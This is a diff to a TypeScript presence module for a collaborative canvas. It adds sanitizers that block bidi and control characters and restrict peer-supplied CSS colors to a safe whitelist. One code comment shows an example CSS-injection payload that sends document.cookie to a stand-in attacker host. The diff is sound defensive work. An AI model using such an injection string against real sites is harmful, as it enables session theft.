@@ -20,14 +20,30 @@ import { throttle, type Throttled } from "@/lib/utils/throttle";
 
 const AVATAR_COLORS = ["#00f0ff", "#a78bfa", "#34d399", "#f59e0b", "#f87171", "#60a5fa", "#fb923c", "#e879f9"];
 
-/** Bidi-override / isolate codepoints — same set as use-presence.ts.
- * Block these in names/chat/reactions so a hostile peer can't visually
- * spoof another user's identity by flipping the rendered direction.
+/** Bidi-override / isolate codepoints + C0 controls + LRM/RLM/ALM.
+ * Block these in names/chat/reactions so a hostile peer can't:
+ *   - visually spoof another user's identity by flipping rendered direction
+ *   - inject control characters that mangle nameplates / devtools readouts
+ *   - flip individual character runs via directional marks
+ *
+ * Kept in sync with use-presence.ts (R11-fix).
  *
  * R5: built from a string literal with `\u` escapes so the source
  * stays pure ASCII. Raw bidi chars in a regex literal get mangled by
  * git autocrlf / editor save passes. */
-const RTL_OVERRIDE_RE = new RegExp("[\\u202A-\\u202E\\u2066-\\u2069]");
+const RTL_OVERRIDE_RE = new RegExp(
+  "[\\u0000-\\u001F\\u007F\\u061C\\u200E\\u200F\\u202A-\\u202E\\u2066-\\u2069]",
+);
+
+/** Whitelist of safe CSS color forms: `#rgb`, `#rrggbb(aa)`,
+ * `rgb()`/`rgba()`, `hsl()`/`hsla()`, or a letters-only named-color
+ * token. The `color` field flows directly into inline-style
+ * properties (border-color, background, color) on cursor-overlay,
+ * which doesn't sanitize style values. Without this check, a hostile
+ * peer broadcasting `color: "red; background-image: url(https://attacker/?c=" + document.cookie + ")"`
+ * would exfiltrate cookies to a third-party domain. Same regex shape
+ * as use-presence.ts's COLOR_SAFE_RE. */
+const COLOR_SAFE_RE = /^(?:#[0-9a-fA-F]{3,8}|rgba?\([0-9.,%\s]+\)|hsla?\([0-9.,%\s]+\)|[a-zA-Z]{1,32})$/;
 
 /**
  * Sanitize an inbound peer payload. Mirrors the validator in
@@ -55,7 +71,12 @@ function sanitizeCanvasPresence(v: unknown): SimplePresence | null {
     typeof r.color !== "string" || r.color.length === 0 || r.color.length > COLOR_CAP ||
     RTL_OVERRIDE_RE.test(r.name) || RTL_OVERRIDE_RE.test(r.id)
   ) return null;
-  const out: SimplePresence = { id: r.id, name: r.name, color: r.color };
+  // Run the trimmed color through the CSS whitelist. Anything that
+  // isn't a recognised CSS color form falls back to a safe default so
+  // the peer still appears in the cursor list — better partial UX
+  // than dropping them entirely for a bad style string.
+  const safeColor = COLOR_SAFE_RE.test(r.color.trim()) ? r.color.trim() : "#94a3b8";
+  const out: SimplePresence = { id: r.id, name: r.name, color: safeColor };
   if (r.cursor && typeof r.cursor === "object") {
     const c = r.cursor as { x?: unknown; y?: unknown };
     if (typeof c.x === "number" && Number.isFinite(c.x) &&
